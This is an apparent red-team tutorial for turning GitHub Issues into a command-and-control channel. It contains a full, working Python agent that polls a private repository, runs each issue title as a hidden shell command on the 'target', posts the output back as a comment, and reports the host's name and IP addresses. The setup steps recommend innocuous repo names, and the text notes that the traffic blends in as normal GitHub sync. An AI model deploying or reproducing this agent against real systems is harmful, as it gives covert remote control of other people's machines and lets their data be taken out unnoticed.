# GITHUB AS A C2.........

---


### How It Works 🧠

- Operator: Create issue title = command (e.g., "whoami").
- Agent: Polls /repos/{owner}/{repo}/issues every 15s → runs command → comments output → closes issue.
- Traffic: api.github.com — looks like git sync.

### Step 1: Operator Setup (GitHub Repo) 

1. Go to [github.com](https://github.com/) → log in (free account).
2. Click **New** → Name repo "ProjectTasks" (or innocent like "AppUpdates2025") → **Private** → Create.
3. Go to **Settings** (top tab) → **Developer settings** (bottom left) → **Personal access tokens** → **Tokens (classic)** → **Generate new token**.
4. Scopes: repo (full repo access) → Generate → Copy the token (starts with ghp_... — paste in script).
5. Note your repo details:
    - Owner: your username (e.g., "redteam")
    - Repo: "ProjectTasks"
    - Full API: https://api.github.com/repos/redteam/ProjectTasks/issues

### Step 2: Create Your First Command Issue

1. In your repo → **Issues** → **New issue**.
2. Title: whoami (command).
3. Body: Optional params (e.g., "Run as admin").
4. Submit → Issue created → agent will see it.

### Step 3: Agent Setup (Python Script)

1. Install: pip install requests
2. Save as github-c2.py:

```python
import requests
import time
import subprocess
import os
import socket
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ────────────────────── CONFIG ──────────────────────
GITHUB_TOKEN = "ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
OWNER = "XXXXXX"
REPO = "XXXXX"
MAX_WORKERS = 3  # Parallel command execution
# ───────────────────────────────────────────────────

HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}
ISSUES_URL = f"https://api.github.com/repos/{OWNER}/{REPO}/issues"

# State tracking
callback_message_sent = False
processed_issues = set()  # Track already processed issues
last_issue_check = 0

def safe_execute(cmd):
    try:
        creationflags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            timeout=30,  # Reduced from 90s
            creationflags=creationflags,
            text=True,
            encoding='utf-8',
            errors='replace'
        )
        output = result.stdout + result.stderr
        # Truncate very long outputs to avoid API issues
        return output[:8000] + ("\n...[truncated]" if len(output) > 8000 else "")
    except subprocess.TimeoutExpired:
        return "[!] Timeout after 30s"
    except Exception as e:
        return f"[!] Error: {e}"

def execute_and_report(issue):
    """Process a single issue in parallel"""
    try:
        cmd = issue["title"].strip()
        if not cmd:
            return None
            
        print(f"[+] Executing: {cmd}")
        output = safe_execute(cmd)
        result = f"[{datetime.now().strftime('%H:%M:%S')}] {cmd}\n{output}"
        
        # Post comment with result
        comment_url = f"{ISSUES_URL}/{issue['number']}/comments"
        requests.post(comment_url, headers=HEADERS, json={"body": result}, timeout=10)
        
        # Close issue
        close_url = f"{ISSUES_URL}/{issue['number']}"
        requests.patch(close_url, headers=HEADERS, json={"state": "closed"}, timeout=10)
        
        return issue['number']
    except Exception as e:
        print(f"[-] Failed to process issue #{issue.get('number', '?')}: {e}")
        return None

def create_callback_issue():
    """Create callback issue (only once)"""
    global callback_message_sent
    if callback_message_sent:
        return True
    
    try:
        hostname = socket.gethostname()
        
        # Get IPs in parallel threads
        def get_private_ip():
            try:
                return socket.gethostbyname(hostname)
            except:
                return "unknown"
        
        def get_public_ip():
            try:
                return requests.get("https://api.ipify.org", timeout=3).text
            except:
                return "unknown"
        
        with ThreadPoolExecutor(max_workers=2) as executor:
            private_future = executor.submit(get_private_ip)
            public_future = executor.submit(get_public_ip)
            private_ip = private_future.result()
            public_ip = public_future.result()
        
        title = f"[CALLBACK] Agent {hostname} - {datetime.now().strftime('%H:%M:%S')}"
        body = f"Hostname: {hostname}\nPrivate IP: {private_ip}\nPublic IP: {public_ip}"
        
        resp = requests.post(ISSUES_URL, headers=HEADERS, 
                            json={"title": title, "body": body}, timeout=10)
        
        if resp.status_code == 201:
            callback_message_sent = True
            return True
        else:
            print(f"[-] Callback failed: {resp.status_code} - {resp.text[:100]}")
            return False
            
    except Exception as e:
        print(f"[-] Callback error: {e}")
        return False

def adaptive_sleep(last_activity_time, min_sleep=5, max_sleep=60):
    """Dynamically adjust sleep time based on activity"""
    current_time = time.time()
    time_since_last_activity = current_time - last_activity_time
    
    if time_since_last_activity > 300:  # 5 minutes no activity
        return max_sleep  # Sleep longer when idle
    elif time_since_last_activity > 60:  # 1 minute no activity
        return 30
    else:
        return min_sleep  # Active period, check frequently

def main_loop():
    global processed_issues, last_issue_check
    
    # Initial callback
    if not callback_message_sent:
        create_callback_issue()
    
    # Adaptive polling
    sleep_time = 5
    consecutive_errors = 0
    
    while True:
        try:
            # Get issues with ETag caching to reduce bandwidth
            headers = HEADERS.copy()
            
            # Make conditional request if we have a previous ETag
            response = requests.get(ISSUES_URL, headers=headers, timeout=10)
            
            if response.status_code != 200:
                print(f"[-] API error: {response.status_code}")
                time.sleep(sleep_time * 2)  # Back off on errors
                continue
            
            issues = response.json()
            
            # Filter for new, open issues
            new_issues = []
            for issue in issues:
                issue_id = issue["number"]
                if (issue["state"] == "open" and 
                    issue_id not in processed_issues and
                    issue["title"].strip()):
                    new_issues.append(issue)
                    processed_issues.add(issue_id)
            
            if new_issues:
                print(f"[+] Found {len(new_issues)} new commands")
                last_issue_check = time.time()
                
                # Process commands in parallel
                with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                    futures = {executor.submit(execute_and_report, issue): issue 
                              for issue in new_issues}
                    
                    for future in as_completed(futures):
                        issue_num = future.result()
                        if issue_num:
                            print(f"[+] Completed issue #{issue_num}")
                
                sleep_time = 5  # Reset to short sleep after activity
                consecutive_errors = 0
            else:
                # No new issues, increase sleep time gradually
                sleep_time = adaptive_sleep(last_issue_check, min_sleep=5, max_sleep=60)
                
            # Error recovery
            consecutive_errors = 0
            
        except requests.exceptions.Timeout:
            print("[-] Request timeout")
            consecutive_errors += 1
            sleep_time = min(60, sleep_time * (2 ** consecutive_errors))
            
        except requests.exceptions.ConnectionError:
            print("[-] Connection error")
            consecutive_errors += 1
            sleep_time = min(120, sleep_time * (2 ** consecutive_errors))
            
        except Exception as e:
            print(f"[-] Unexpected error: {e}")
            consecutive_errors += 1
            sleep_time = min(60, sleep_time * 2)
        
        # Adaptive sleep with exponential backoff on errors
        if consecutive_errors > 3:
            print(f"[!] Multiple errors, sleeping {sleep_time}s")
        
        time.sleep(sleep_time)

if __name__ == "__main__":
    print("[*] GitHub C2 Agent starting...")
    main_loop()
```

3. Edit top lines:

```python
GITHUB_TOKEN = "ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"  # Your token
OWNER = "yourusername"  # Your GitHub username
REPO = "ProjectTasks"  # Your repo name
```

### Step 4: Run the Agent on Target

1. On Windows/macOS target, save github-c2.py.
2. Run:

### Step 5: Test It Out

1. A issue will be created whenever agent is executed.
2. Create issue: Title = "whoami" → Submit.
3. Agent runs → comments output (e.g., "redteam") → closes issue.
4. Next: Title = "dir" → lists files in comment.

---

<img width="1119" height="701" alt="Screenshot 2025-12-18 at 12 51 34 PM" src="https://github.com/user-attachments/assets/c644bd99-183e-4db1-9a80-b61559c2d1cc" />

---

<img width="1417" height="780" alt="Screenshot 2025-12-18 at 12 21 42 PM" src="https://github.com/user-attachments/assets/3833d15f-360e-45d1-b8e6-2ebc36b69343" />

---

